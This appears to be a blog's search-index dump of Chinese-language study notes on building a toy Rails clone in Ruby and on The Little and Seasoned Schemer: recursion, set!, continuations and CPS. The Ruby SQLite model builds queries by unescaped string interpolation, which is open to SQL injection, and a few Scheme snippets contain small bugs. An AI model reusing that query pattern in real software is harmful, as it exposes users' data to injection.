conn.execute \u0026lt;\u0026lt;SQL create table my_table ( id INTEGER PRIMARY KEY, posted INTEGER, title VARCHAR(30), body VARCHAR(32000)); SQL Model # rulers/lib/rulers/sqlite_model.rb require \u0026#34;sqlite3\u0026#34; require \u0026#34;rulers/util\u0026#34; DB = SQLite3::Database.new \u0026#34;test.db\u0026#34; module Rulers module Model class SQLite def initialize(data = nil) @hash = data end # table\u0026#39;s meta data def self.table Rulers.to_underscore name end def self.schema return @schema if @schema @schema = {} DB.table_info(table) do |row| @schema[row[\u0026#34;name\u0026#34;]] = row[\u0026#34;type\u0026#34;] end @schema end # ruby val -\u0026gt; sql\u0026#39;s ds in ruby string def self.to_sql(val) case val when Numeric val.to_s when String \u0026#34;\u0026#39;#{val}\u0026#39;\u0026#34; else raise \u0026#34;Can\u0026#39;t change #{val.class} to SQL!\u0026#34; end end # 產生新model for a row def self.create(values) values.delete \u0026#34;id\u0026#34; keys = schema.keys - [\u0026#34;id\u0026#34;] vals = keys.map do |key| values[key] ? to_sql(values[key]) : \u0026#34;null\u0026#34; end DB.execute \u0026lt;\u0026lt;SQL INSERT INTO #{table} (#{keys.join \u0026#34;,\u0026#34;}) VALUES (#{vals.join \u0026#34;,\u0026#34;}); SQL data = Hash[keys.zip vals] sql = \u0026#34;SELECT last_insert_rowid();\u0026#34; data[\u0026#34;id\u0026#34;] = DB.execute(sql)[0][0] self.new data end def self.find(id) row = DB.execute \u0026lt;\u0026lt;SQL select #{schema.keys.join \u0026#34;,\u0026#34;} from #{table} where id = #{id}; SQL data = Hash[schema.keys.zip row[0]] self.new data end # operate on DB directly def self.count DB.execute(\u0026lt;\u0026lt;SQL)[0][0] SELECT COUNT(*) FROM #{table} SQL end def save! unless @hash[\u0026#34;id\u0026#34;] self.class.create return true end fields = @hash.map do |k, v| \u0026#34;#{k}=#{self.class.to_sql(v)}\u0026#34; end.join \u0026#34;,\u0026#34; DB.execute \u0026lt;\u0026lt;SQL UPDATE #{self.class.table} SET #{fields} WHERE id = #{@hash[\u0026#34;id\u0026#34;]} SQL true end def save self.save! rescue false end # operate on model\u0026#39;s hash (no DB business) def [](name) @hash[name.to_s] end def []=(name, value) @hash[name.to_s] = value end end end end method_missing \u0026amp; define_method Model的accessor!!\nclass MyClass [\u0026#34;foo\u0026#34;, \u0026#34;bar\u0026#34;].each do |method| define_method(method) { puts \u0026#34;Obj #{method}\u0026#34; } end end myobj = MyClass.new myobj.foo myobj.bar When you call a method that doesnʼt exist on an object, its method called “method_missing” will be called to tell it so. If you override method_missing to check for column names, you can instead just return the column value from method_missing, which will return it from the original call.\nCh8 Rack Middleware rack app的interface(type signature) \u0026amp; 如何疊app # sample_dir/config.ru class Canadianize def initialize(app, arg = \u0026#34;\u0026#34;) @app = app # next rack app @arg = arg # args end def call(env) # env -\u0026gt; [ status, headers, content ] status, headers, content = @app.call(env) content[0] += @arg + \u0026#34;, eh?\u0026#34; [ status, headers, content ] end end use Canadianize, \u0026#34;, simple\u0026#34; run proc { [200, {\u0026#39;Content-Type\u0026#39; =\u0026gt; \u0026#39;text/html\u0026#39;}, [\u0026#34;Hello, world\u0026#34;]] } map # sample_dir/config.ru require \u0026#34;rack/lobster\u0026#34; use Rack::ContentType map \u0026#34;/lobster\u0026#34; do use Rack::ShowExceptions run Rack::Lobster.new end map \u0026#34;/lobster/but_not\u0026#34; do run proc { [200, {}, [\u0026#34;Really not a lobster\u0026#34;]] } end run proc { [200, {}, [\u0026#34;Not a lobster\u0026#34;]] } If thereʼs could be two that match, the longer path is checked first.\nCh9 Real Routing Controller Actions are Rack Apps Before\nmodule Rulers class Application def call(env) if env[\u0026#39;PATH_INFO\u0026#39;] == \u0026#39;/favicon.ico\u0026#39; return [404, {\u0026#39;Content-Type\u0026#39; =\u0026gt; \u0026#39;text/html\u0026#39;}, []] end klass, act = get_controller_and_action(env) controller = klass.new(env) # get env from the previous line, so this line should be eliminated text = controller.send(act) # should not expose how to execute an action if controller.get_response # this is controller(rack app)\u0026#39;s responsibility st, hd, rs = controller.get_response.to_a [st, hd, [rs.body].flatten] else [200, {\u0026#39;Content-Type\u0026#39; =\u0026gt; \u0026#39;text/html\u0026#39;}, [text]] end # rack_app = klass.action(act) # rack_app.call(env) end end end After\n# rulers/lib/rulers.rb module Rulers class Application def call(env) if env[\u0026#39;PATH_INFO\u0026#39;] == \u0026#39;/favicon.ico\u0026#39; return [404, {\u0026#39;Content-Type\u0026#39; =\u0026gt; \u0026#39;text/html\u0026#39;}, []] end klass, act = get_controller_and_action(env) rack_app = klass.action(act) rack_app.call(env) end end end # rulers/lib/rulers/controller.rb module Rulers class Controller include Rulers::Model def initialize(env) @env = env @routing_params = {} # Add this line! end def dispatch(action, routing_params = {}) @routing_params = routing_params text = self.send(action) if get_response st, hd, rs = get_response.to_a [st, hd, [rs].flatten] else [200, {\u0026#39;Content-Type\u0026#39; =\u0026gt; \u0026#39;text/html\u0026#39;}, [text].flatten] end end def self.action(act, rp = {}) proc { |e| self.new(e).dispatch(act, rp) } end def params request.params.merge @routing_params end end end Route 也就是 match Usuge\n# best_quotes/config.ru require \u0026#34;./config/application\u0026#34; app = BestQuotes::Application.new use Rack::ContentType app.route do match \u0026#34;\u0026#34;, \u0026#34;quotes#index\u0026#34; match \u0026#34;sub-app\u0026#34;, proc { [200, {}, [\u0026#34;Hello, sub-app!\u0026#34;]] } # default routes match \u0026#34;:controller/:id/:action\u0026#34; match \u0026#34;:controller/:id\u0026#34;, :default =\u0026gt; { \u0026#34;action\u0026#34; =\u0026gt; \u0026#34;show\u0026#34; } match \u0026#34;:controller\u0026#34;, :default =\u0026gt; { \u0026#34;action\u0026#34; =\u0026gt; \u0026#34;index\u0026#34; } end run app match \u0026amp; routeObject\n# rulers/lib/rulers/routing.rb class RouteObject def initialize @rules = [] end def match(url, *args) options = {} options = args.pop if args[-1].is_a?(Hash) options[:default] ||= {} dest = nil dest = args.pop if args.size \u0026gt; 0 raise \u0026#34;Too many args!\u0026#34; if args.size \u0026gt; 0 parts = url.split(\u0026#34;/\u0026#34;) parts.select! { |p| !p.empty? } vars = [] regexp_parts = parts.map do |part| if part[0] == \u0026#34;:\u0026#34; vars \u0026lt;\u0026lt; part[1..-1] \u0026#34;([a-zA-Z0-9]+)\u0026#34; elsif part[0] == \u0026#34;*\u0026#34; vars \u0026lt;\u0026lt; part[1..-1] \u0026#34;(.*)\u0026#34; else part end end regexp = regexp_parts.join(\u0026#34;/\u0026#34;) @rules.push({ :regexp =\u0026gt; Regexp.new(\u0026#34;^/#{regexp}$\u0026#34;), :vars =\u0026gt; vars, :dest =\u0026gt; dest, :options =\u0026gt; options, }) end def check_url(url) @rules.each do |r| m = r[:regexp].match(url) if m options = r[:options] params = options[:default].dup r[:vars].each_with_index do |v, i| params[v] = m.captures[i] end dest = nil if r[:dest] return get_dest(r[:dest], params) else controller = params[\u0026#34;controller\u0026#34;] action = params[\u0026#34;action\u0026#34;] return get_dest(\u0026#34;#{controller}\u0026#34; + \u0026#34;##{action}\u0026#34;, params) end end end nil end def get_dest(dest, routing_params = {}) return dest if dest.respond_to?(:call) if dest =~ /^([^#]+)#([^#]+)$/ name = $1.capitalize cont = Object.const_get(\u0026#34;#{name}Controller\u0026#34;) return cont.action($2, routing_params) end raise \u0026#34;No destination: #{dest.inspect}!\u0026#34; end end # And now, the Application: module Rulers class Application def route(\u0026amp;block) @route_obj ||= RouteObject.new @route_obj.instance_eval(\u0026amp;block) end def get_rack_app(env) raise \u0026#34;No routes!\u0026#34; unless @route_obj @route_obj.check_url env[\u0026#34;PATH_INFO\u0026#34;] end end end Conclusion from env to res env -\u0026gt; router -\u0026gt; Controller -----------------------\u0026gt; (Real)Controller -\u0026gt; res / \\ / \\ | | env req -\u0026gt; parmas / \\ / \\ | | env router / \\ | env 基本上這本書的九個把Rails的核心精神都帶到了，這裡是縮減版的rails與上面的很像，不過某些部分多了一些包裝。\nAppendix: Unobtrusive JavaScript JavaScript 不再需要與 HTML 混在一起\n原本是\n\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;date\u0026#34; onchange=\u0026#34;validateDate()\u0026#34;/\u0026gt; 變成\n\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;date\u0026#34; id=\u0026#34;date\u0026#34; /\u0026gt; window.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;，function（event）{ document.getElementById(\u0026#39;date\u0026#39;).addEventListener(\u0026#34;change\u0026#34;，validateDate); }); 先找出要的DOM，之後再JS中設定該DOM。\n找出要的DOM，可透過id或class，甚至是DOM的traversal\n原本但是找到之後，要怎麼儲存這個DOM的狀態??\n原本都是在JS中來保存，但這樣就會變成DOM的狀態與程式邏輯的狀態會混在一起。\n所以之後有了data attributes!!\n","permalink":"https://littlebees.github.io/2020/04/rebuilding-rails%E7%9A%84%E5%BF%83%E5%BE%97/","summary":"Ch1 Zero to “It Works!” Gem的檔案結構 $ bundle gem rulers create rulers/Gemfile create rulers/Rakefile create rulers/LICENSE.txt create rulers/README.md create rulers/.gitignore create rulers/rulers.gemspec # !! create rulers/lib/rulers.rb # !! create rulers/lib/rulers/version.rb Initializating git repo in src/rulers rulers/rulers.gemspec放的是gem的資訊與dependency\nrulers/lib/rulers.rb就是主程式\ndependency分成development與runtime # rulers.gemspec gem.add_development_dependency \u0026#34;rspec\u0026#34; gem.add_runtime_dependency \u0026#34;rest-client\u0026#34; rack進入點 與 rack app回傳值的資料結構 # best_quotes/config.ru run proc { [200, {\u0026#39;Content-Type\u0026#39; =\u0026gt; \u0026#39;text/html\u0026#39;}, [\u0026#34;Hello, world!\u0026#34;]] } 狀態值,header,資料\nrack app 的 interface # rulers/lib/rulers.rb require \u0026#34;rulers/version\u0026#34; module Rulers class Application def call(env) [200, {\u0026#39;Content-Type\u0026#39; =\u0026gt; \u0026#39;text/html\u0026#39;}, [\u0026#34;Hello from Ruby on Rulers!","title":"Rebuilding Rails的心得"},{"content":"前言 The Seasoned Schemer(TSS)的目的是補完TLS中沒有提及的狀態。 這篇筆記同樣不依照章節順序，用主題式的方式，把我心中的這本書呈現出來。\n行前須知 知道什麼是?\nScheme 遞迴 accumulator parameter reverse 如果要反轉list，在有append情況下可以寫成\n(define (rev l) (if (null? l) \u0026#39;() (append (rev (cdr l)) (cons (car l) \u0026#39;())))) 但我們需要一直append嗎? 如果我們可以從第一個開始就先cons出來的東西，不就是我們要的。\n(define (rev l acc) (if (null? l) acc (rev (cdr l) (cons (car l) acc)))) 引入acc可以記下我們從頭到目前看過的東西。\nflatten 同樣在要攤平list時，如果有append可寫成\n(define (atom? x) (and (not (pair? x)) (not (null? x)))) (define (fl lol) (cond [(null? lol) \u0026#39;()] [(atom? (car lol)) (cons (car lol) (fl (cdr lol)))] [else (append (fl (car lol)) (fl (cdr lol)))])) 這裡是不是可以利用剛剛acc可以記下目前看過的東西的特性來改寫呢?\n(define (flat lol acc) (cond [(null? lol) acc] [(atom? (car lol)) (flat (cdr lol) (cons (car lol) acc))] [else (flat (cdr lol) (flat (car lol) acc))])) ;;先走car，再走cdr 但是這樣出來的是反的，要記得反轉。\nlet \u0026amp; letrec 從TLS到現在引入變數不是用define(全域)，不然就是lambda(區域) 如果想引入區域變數，就要用lambda，且apply值，不過這樣寫起來還蠻難看的。 所以有let\n(let ((a 10)) (+ a 10)) \u0026lt;=\u0026gt; ((lambda (a) (+ a 10)) 10) 但這樣無法遞迴，如果要遞迴就是用Y組合子，不然就是letrec\n(letrec ((len (lambda (l) (if (null? l) 0 (+ 1 (len (cdr l))))))) len) \u0026lt;=\u0026gt; (define len (lambda (l) (if (null? l) 0 (+ 1 (len (cdr l)))))) let over lambda 如果把let包在lambda外面會變成像\n(let ((a ...)) (lambda (...) ...)) 這樣會變成只有這個lambda看的到a，可以用這個手法保護變數。 還可以搭配set!做出getter與setter，十分OO。\nset! 一般常見的程式語言中都有改寫變數值的方法。 Scheme也有叫set!\n(define a 10) ;; a is 10 (set! a 20) ;; a is 20 原本在同一個scope中的變數的資料都是不會變的，現在就被打破了!!\n我們必須意識到與自行安排與管理狀態與時間。\n原本用lambda可以做出List的效果\n(define ((kons a d) f) (f a d)) (define (kar c) (c (lambda (a d) a))) (define (kdr c) (c (lambda (a d) d))) 但現在把set!做到List中，我們只需要set-kdr!\n(define (bons a) (let ((d \u0026#39;())) (lambda (f) (f (lambda (x) (set! d x)) a d)))) (define (kar c) (c (lambda (s a d) a))) (define (kdr c) (c (lambda (s a d) d))) (define (set-kdr! c x) ((c (lambda (s a d) s)) x)) (define (kons a d) (let ((c (bons a))) (set-kdr! c d) c)) 有了set-kdr!就可以做出cycle， 要怎麼找出cycle?\n首先要找出兩個變數是不是一樣，沒有set!之前，只要值相等，這兩個變數就是一樣的． 但有了set!就不一樣了，所謂的一樣應該是來自同一個地方才對． 所以相等的也不等於一樣了，如果一樣，set!後應該會同時改變才對．\n(define (same? a b) (let ((t1 (kdr a)) (t2 (kdr b))) (set-kdr a 1) (set-kdr b 2) (let ((ans (= (kdr a) (kdr b)))) (set-kdr a t1) (set-kdr b t2) ans))) (define (same? a b) (let ((t1 (cdr a)) (t2 (cdr b))) (set-cdr! a 1) (set-cdr! b 2) (let ((ans (= (cdr a) (cdr b)))) (set-cdr! a t1) (set-cdr! b t2) ans))) 如果兩個速度不同的人在cycle中走，那速度快的一定會碰到速度慢的． 所以讓兩個變數往前走，但速度不同就好，而龜兔賽跑演算法速度給(1,2)．\n(define (finite-len p) (letcc out (letrec ((C (lambda (p q) (cond ((same? p q) (out ‘oops)) ((null? q) 0) ((null? (kdr q)) 1) (else (+ (C (kddr p) (kdr q)) 2))) (kddr (lambda (x) (kdr (kdr x)))))) (if (null? p) 0 (add1 (C p (kdr p))))))) (define (finite-len l) (call-with-current-continuation (lambda (oops) (define (F a b) (cond ((null? b) 0) ((same? a b) (oops \u0026#39;no)) (else (+ 1 (F (cdr a) (cddr b)))))) (cond ((null? l) 0) ((null? (cdr l)) 1) (else (+ 1 (F l (cdr l)))))))) (0,1) - (+2,+1) -\u0026gt; (2,2)\nletrec \u0026amp; let \u0026amp; set! 為什麼let引入的變數沒辦法遞迴?\n因為在lambda中其實看不到遞迴的那個變數。 所以在Y組合子的遞迴函數那邊才會多一個接收另一個函數的參數。\n那多了set!的現在，能不能簡單的完成遞迴?(在沒有define的狀態下)\n先引入遞迴函數的名字(let)，再用看的到該名字的lambda改寫變數(set!)\n(let ((len \u0026#39;whatever)) (set! len (lambda (l) (if (null? l) 0 (+ 1 (len (cdr l)))))) len) \u0026lt;=\u0026gt; (define len (lambda (l) (if (null? l) 0 (+ 1 (len (cdr l)))))) \u0026lt;=\u0026gt; (letrec ((len (lambda (l) (if (null? l) 0 (+ 1 (len (cdr l))))))) len) Y! 有了set!可以有新的遞迴產生方法，那能不能有新的Y組合子? 從len開始看。\n(define len (lambda (l) (if (null? l) 0 (+ 1 (len (cdr l)))))) 用剛剛的方式改寫\n(define len (let ((len2 \u0026#39;whatever)) (set! len2 (lambda (l) (if (null? l) 0 (+ 1 (len2 (cdr l)))))) ;; !! len2)) lambda與len2綁在一起，我們必須要抽出來\n(define len (let ((len2 \u0026#39;whatever)) (set! len2 (lambda (f) ;; !! (lambda (l) (if (null? l) 0 (+ 1 (f (cdr l)))))) ;; !! len2)) f必須是個可以碰到len2的函數，來把參數丟進去。\n(define len (let ((len2 \u0026#39;whatever)) (set! len2 ((lambda (f) (lambda (l) (if (null? l) 0 (+ 1 (f (cdr l)))))) (lambda (arg) (len2 arg))) len2)) 熟悉的東西出來了，抽出來。\n(define lenMK (lambda (f) (lambda (l) (if (null? l) 0 (+ 1 (f (cdr l))))))) (define (Y! mk) (let ((len2 \u0026#39;whatever)) (set! len2 (mk (lambda (arg) (len2 arg))) len2))) (define len (Y! lenMK)) continuation continuation可以想像成代辦事項或是Program conuter，也許會比較好想像一點。 如果改變continuation的內容，可以讓原本的程式跑去做別的事，一去不復返，或是再回來同一個地方。\ncontinuation可以當成C語言中的label，調用continuation就是用jump。 但與label不同的是這是可以存在變數的label!!\nescape from here 連乘List中的數字\n(define (fac l) (if (null? l) 1 (* (car l) (fac (cdr l))))) 不過如果中間有0的話應該不用繼續做下去，要直接跳出去。 那我們應該可以用continuation來跳出去，只要continuation在程式的外面就ok了\n(define call/cc call-with-current-continuation) (define (fac l) (call/cc (lambda (escape) (define (fac2 l) (cond [(null? l) 1] [(zero? (car l)) (escape 0)] [else (* (car l) (fac2 (cdr l)))])) (fac2 l)))) 一旦調用了escape整個call/cc的回傳值會變成傳入escape中的資料。 如果沒有用到escape call/cc的部分就像不存在一樣。\ngo back to here (define return 0) (define resume 0) (define (walk* lol) (cond ((null? lol) \u0026#39;empty) ((atom? (car lol)) (call/cc (lambda (here) (set! resume here) (return (car lol)))) (walk* (cdr lol))) (else (walk* (car lol)) (walk* (cdr lol))))) (define (get-next) (call/cc (lambda (here) (set! return here) (resume \u0026#39;whatever)))) (define (loop old) (if (eq? old \u0026#39;nothing) #f (let ((secend-one (get-next))) (if (eq? secend-one old) #t (loop secend-one))))) (define (two* lol) (let ((first-one (call/cc (lambda (here) (set! return here) (walk* lol) (return \u0026#39;nothing))))) (loop first-one))) iteraor \u0026amp; set! \u0026amp; define define 可以當成lambda引入新的變數(參數)\nset! 視為partial apply 來自define的參數\n;; [LISTOF X] -\u0026gt; ( -\u0026gt; X u \u0026#39;you-fell-off-the-end) (define (generate-one-element-at-a-time lst) ;; Hand the next item from a-list to \u0026#34;return\u0026#34; or an end-of-list marker (define (control-state return) (for-each (lambda (element) (set! return (call-with-current-continuation (lambda (resume-here) ;; Grab the current continuation (set! control-state resume-here) (return element))))) lst) (return \u0026#39;you-fell-off-the-end)) ;; (-\u0026gt; X u \u0026#39;you-fell-off-the-end) ;; This is the actual generator, producing one item from a-list at a time (define (generator) (call-with-current-continuation control-state)) ;; Return the generator generator) (define generate-digit (generate-one-element-at-a-time \u0026#39;(0 1 2))) 陰陽謎題 (define (now) (call-with-current-continuation (lambda (c) c))) (let* ((yin (let ((cc (now))) (display #\\@) cc)) (yang (let ((cc (now))) (display #\\*) cc))) (yin yang)) 一開始會印出@*\n再來會跳回去yin的call/cc，所以此時的yin是上一次的yang(第一個)，所以新出現的yang(第二個)會apply到第一個yang去，所以會再多印一個*，所以總共印@**\n在這裏第二個yang透過原本的yin跳回去印@，再產生第三個yang再印一個*，如此重複\n在每一次的循環中產生新的yang，所以經過每一次的循環都會多一個*\n略過的部分 直譯器 直譯器等到以後打EoPL與LiSP的心得再說。 ","permalink":"https://littlebees.github.io/2020/04/the-seasoned-schemer%E8%AE%80%E5%BE%8C%E7%AD%86%E8%A8%98/","summary":"前言 The Seasoned Schemer(TSS)的目的是補完TLS中沒有提及的狀態。 這篇筆記同樣不依照章節順序，用主題式的方式，把我心中的這本書呈現出來。\n行前須知 知道什麼是?\nScheme 遞迴 accumulator parameter reverse 如果要反轉list，在有append情況下可以寫成\n(define (rev l) (if (null? l) \u0026#39;() (append (rev (cdr l)) (cons (car l) \u0026#39;())))) 但我們需要一直append嗎? 如果我們可以從第一個開始就先cons出來的東西，不就是我們要的。\n(define (rev l acc) (if (null? l) acc (rev (cdr l) (cons (car l) acc)))) 引入acc可以記下我們從頭到目前看過的東西。\nflatten 同樣在要攤平list時，如果有append可寫成\n(define (atom? x) (and (not (pair? x)) (not (null? x)))) (define (fl lol) (cond [(null? lol) \u0026#39;()] [(atom? (car lol)) (cons (car lol) (fl (cdr lol)))] [else (append (fl (car lol)) (fl (cdr lol)))])) 這裡是不是可以利用剛剛acc可以記下目前看過的東西的特性來改寫呢?","title":"The Seasoned Schemer讀後筆記"},{"content":"前言 The Little Schemer(TLS)的目的是教讀者寫遞迴。 這篇筆記不依照章節順序，用主題式的方式，把我心中的這本書呈現出來。\n行前須知 知道什麼是?\nbase 與 inductive case 在歸納法中大概的意思 快速Scheme Tutorial 調用: (\u0026lt;function-or-operator) \u0026lt;args...\u0026gt;) 宣告變數: (define \u0026lt;var-name\u0026gt; \u0026lt;value\u0026gt;) 條件式:\n(if \u0026lt;predicate\u0026gt; \u0026lt;when-true\u0026gt; \u0026lt;when-false\u0026gt;) (cond [\u0026lt;predicate\u0026gt; \u0026lt;do-somthing\u0026gt;] ... [else \u0026lt;do-somthing\u0026gt;]) 函數:\n(define \u0026lt;func-name\u0026gt; (lambda (\u0026lt;args...\u0026gt;) \u0026lt;do-somthing\u0026gt;)) ;; OR (define (\u0026lt;func-name\u0026gt; (\u0026lt;args...\u0026gt;)) \u0026lt;do-somthing\u0026gt;) 匿名函數:\n(lambda (\u0026lt;args...\u0026gt;) \u0026lt;do-somthing\u0026gt;) 本書用到的資料結構介紹 Atom \u0026lt;line-of-characters\u0026gt;還有數字\nList of OO 有哪些可能性(case) base case: 空 inductive case: 有東西 建構 空 的case : \u0026lsquo;() 有東西 的case : cons 分解 有東西 的case : car 與 cdr 對應到cons有兩個參數，所以會有兩個解構子。 區分case 空 的case : null? Integer 有哪些可能性(case) base case: 0 inductive case: 零以上 建構 0 的case : 0 零以上 的case : add1 分解 零以上 的case : sub1 區分case 0 的case : zero? List of List \u0026amp; S-Exp 後面再說\n在 OO 上做遞迴 遞迴就是分解資料再建構出需要的資料。\n所以在寫遞迴程式之前要先問是對什麼資料做遞迴，不同的資料有不同的分解方式。\n先來看看如何分解資料，如何分解資料與資料結構的定義有關。\nList只有兩種case，空的(()) 或是 有一個東西加在前面(cons x (sub-list)) 所以要寫 List of Atom的函數時要區分這兩種case，同時做相對應的處理。 所以List of Atom的程式大致上都會長成\n(define (\u0026lt;func-name\u0026gt; l ...) (if (null? l) \u0026lt;when l is () \u0026gt; \u0026lt;when l is (cons x (sub-list))\u0026gt;)) Integer與List of Atom很像，但是\n空的 變成 零 (cons x \u0026hellip;) 變成 (add1 \u0026hellip;) 與List of Atom的程式有八十七%像 (define (\u0026lt;func-name\u0026gt; n ...) (if (zero? n) \u0026lt;when n is () \u0026gt; \u0026lt;when n is (cons x (sub-list))\u0026gt;)) 還有一個是List of List，其實就是樹。 與List of Atom不同的是Atom沒有不同的case要處理但是List有兩種case要處理!! 因此List of List的程式還要看第一個東西是不是List\n(define (\u0026lt;func-name\u0026gt; l ...) (if (null? l) \u0026lt;when l is () \u0026gt; (if (atom? (car l)) \u0026lt;when (car l) is atom\u0026gt; \u0026lt;when (car l) is list\u0026gt;))) 所以從上面的三個模板可以看到，遞迴程式的骨架，是與資料結構的定義綁在一起的。\n接著來看怎麼重組資料，像同樣對List of Atom做遞迴可以有\n吃 List of Atom 回傳 該List長度 的 length 吃 List of Atom 與 某個Atom 回傳 移除該Atom的List of Atom 的 rember 找著前面的List of Atom模板，可以快速寫出\n(define (length l) (if (null? l) ... ...)) (define (rember l x) (if (null? l) ... ...)) length的回傳值是Integer，所以一定會用到建構Integer的工具， 0就是建構零這個case的工具，另一個case就是用add1。\nrember的List of Atom，有兩種case，空是()，前面有東西是(cons x \u0026lt;sub-list\u0026gt;)。 所以上面兩個程式寫成\n(define (length l) (if (null? l) 0 (add1 ...))) (define (rember l x) (if (null? l) \u0026#39;() (if (eq? x (car x)) ;; 第一項是不是x ... (cons (car l) ...)))) 接著剩下的部分要填什麼? 遞迴的時候!!\n(define (length l) (if (null? l) 0 (add1 (length (cdr l))))) (define (rember l x) (if (null? l) \u0026#39;() (if (eq? x (car x)) ;; 第一項是不是x (rember (cdr l) x) (cons (car l) (rember (cdr l) x))))) 基本上，遞迴只要確定要遞迴的資料結構，就很簡單。 依據輸入的資料結構分解，依循回傳的資料結構建構資料。\n但是還是有一些奇耙的遞迴，像河內塔與阿克曼函數。\n本書介紹的遞迴都是原始遞迴函數(primitive recursive function)。 也就是說，每次遞迴時只有一個參數與遞迴有關，同時參數只縮小一個單位，其他參數保持不變。\n像斐波那契就不是原始遞迴函數，詳細的可以去這裡看。\nequal? \u0026amp; s-exp 來試著寫寫相等吧，先從Atom開始。\n(define (eqAtom? a b) (cond [(and (number? a) (number? b)) (= a b)] ;; 都是數字用 = [(or (number? a) (number? b)) #f] ;; 連type都不一樣就一定不一樣 [else (eq? a b)])) ;; 都是symbol用eq? 接著寫List of List的。 先把所有可能性列出來 3*3 = 9 3是List of List的case數\n(define (eqList? a b) (cond [(and (null? a) (null? b)) #t] [(and (null? a) (atom? (car b))) ;; !! #f] [(null? a) ;; !! #f] [(and (atom? (car a)) (null? b)) #f] [(and (atom? (car a)) (atom? (car b))) (and (eqAtom? (car a) (car b)) (eqList? (cdr a) (cdr b)))] [(atom? (car a)) #f] [(null? b) #f] [(atom? (car b))) #f] [else (and (eqList? (car a) (car b)) (eqList? (cdr a) (cdr b)))])) 只要有(null? a)就是錯，所以可以合起來，讓下面的吃掉上面的， 因為下面的可以cover上面的情形。\n(define (eqList? a b) (cond [(and (null? a) (null? b)) #t] [(null? a) ;; !!1 #f] [(and (atom? (car a)) (null? b)) #f] [(and (atom? (car a)) (atom? (car b))) (and (eqAtom? (car a) (car b)) (eqList? (cdr a) (cdr b)))] [(atom? (car a)) ;; !! 2 #f] [(null? b) ;; !!1 #f] [(atom? (car b))) ;; !!2 #f] [else (and (eqList? (car a) (car b)) (eqList? (cdr a) (cdr b)))])) 回答都是錯，同時條件之間，不會互相影響，在and後做都ok， 所以用or合起來。\n(define (eqList? a b) (cond [(and (null? a) (null? b)) #t] [(or (null? a) (null? b)) #f] [(and (atom? (car a)) (null? b)) ;; !! #f] [(and (atom? (car a)) (atom? (car b))) (and (eqAtom? (car a) (car b)) (eqList? (cdr a) (cdr b)))] [(or (atom? (car a)) (atom? (car b)))) #f] [else (and (eqList? (car a) (car b)) (eqList? (cdr a) (cdr b)))])) 過了第2條式子，代表a與b皆不為空，在後面的式子與檢查a或b是空的都沒有用。 可以刪掉。\n(define (eqList? a b) (cond [(and (null? a) (null? b)) #t] [(or (null? a) (null? b)) #f] [(and (atom? (car a)) (atom? (car b))) (and (eqAtom? (car a) (car b)) (eqList? (cdr a) (car b)))] [(or (atom? (car a)) (atom? (car b))) #f] [else (and (eqList? (car a) (car b)) (eqList? (cdr a) (cdr b)))])) 其實寫的時候要遵照，先and再or，從最小的case開始到後面的case， 就可以直接寫出最終版了。\n接著寫個萬用的equal?\n(define (equal? a b) (cond [(and (atom? a) (atom? b)) (eqAtom? a b)] [(or (atom? a) (atom? b)) #f] [else (eqList? a b)])) 先把相關的程式列出來看看。\n(define (eqAtom? a b) (cond [(and (number? a) (number? b)) (= a b)] [(or (number? a) (number? b)) #f] [else (eq? a b)])) (define (eqList? a b) (cond [(and (null? a) (null? b)) #t] [(or (null? a) (null? b)) #f] [(and (atom? (car a)) (atom? (car b))) ;; !! (and (eqAtom? (car a) (car b)) (eqList? (cdr a) (car b)))] [(or (atom? (car a)) (atom? (car b))) ;; !! #f] [else (and (eqList? (car a) (car b)) ;; !! (eqList? (cdr a) (cdr b)))])) (define (equal? a b) (cond [(and (atom? a) (atom? b)) ;; !! (eqAtom? a b)] [(or (atom? a) (atom? b)) ;; !! #f] [else (eqList? a b)])) ;; !! eqList?與equal?的後三條式子好像!! 有沒有辦法用equal?來縮減eqList?? 如果用equal?先求(car a)是否等於(car b)的話\u0026hellip;\n(define (eqList? a b) (cond [(and (null? a) (null? b)) #t] [(or (null? a) (null? b)) #f] [else (and (equal? (car a) (car b)) (eqList? (cdr a) (cdr b)))])) (define (equal? a b) (cond [(and (atom? a) (atom? b)) (eqAtom? a b)] [(or (atom? a) (atom? b)) #f] [else (eqList? a b)])) 最後，再把所有式子列出來吧。\n(define (eqAtom? a b) (cond [(and (number? a) (number? b)) (= a b)] [(or (number? a) (number? b)) #f] [else (eq? a b)])) (define (eqList? a b) (cond [(and (null? a) (null? b)) #t] [(or (null? a) (null? b)) #f] [else (and (equal? (car a) (car b)) (eqList? (cdr a) (cdr b)))])) (define (equal? a b) (cond [(and (atom? a) (atom? b)) (eqAtom? a b)] [(or (atom? a) (atom? b)) #f] [else (eqList? a b)])) 到這裡就可以看出Lisp的s-exp的定義了。\nS-Exp Atom Number Symbol List Null Cons List first-class function \u0026amp; CPS 一級函數可以捕捉變數，與當成資料丟來丟去，所以可以用它來做一些噁心的事。\n像我們可以試著替下面這個函數加入C語言中的return\n(define (sum l) (if (null? l) 0 (+ (car l) (sum (cdr l))))) 0可以直接return，但是return要從哪裡來? 我們可以多加一個參數，叫return\n(define (sum l return) (if (null? l) (return 0) (return (+ (car l) (sum (cdr l)))))) 等等，(sum (cdr l))是不是少了一個參數，要給他什麼?\n痾\u0026hellip;，直接傳入return? 但是這樣接不起來\u0026hellip;\n(return 0)應該要回到，(+ (car l) 0)才對 所以(return 0)的return應該是\n(lambda (n) (+ (car l) n)) 這個加總應該要return才對，所以再改成\n(lambda (n) (return (+ (car l) n))) 可以回到原本的sum了\n(define (sum l return) (if (null? l) (return 0) (return (+ (car l) (sum (cdr l) (lambda (n) (return (+ (car l) n)))))))) 痾\u0026hellip;，那個最外層的(return (+ ...))不是在lambda中嗎 應該要刪掉吧\n(define (sum l return) (if (null? l) (return 0) (sum (cdr l) (lambda (n) (return (+ (car l) n)))))) 這個就是cps版本的sum，觀察這個程式會發現\n他從遞迴變成迴圈了 每過一次迴圈，return會變多變長，所以 雖然說是迴圈，但是遞迴的成本還在 這return是函數，所以應該可以有(回傳)多個參數 像是說再sum中加入看有沒有0的功能\n(define (sum l return) (if (null? l) (return 0 #f) (sum (cdr l) (lambda (n z) (return (+ (car l) n) (or (zero? (car l)) z)))))) 完成了cps版本的程式，那有沒有辦法直接轉出cps的作法? 先看無cps與cps的對比\n(define (sum l) (if (null? l) 0 (+ (car l) (sum (cdr l))))) (define (sum l return) (if (null? l) (return 0) (sum (cdr l) (lambda (n) (return (+ (car l) n)))))) 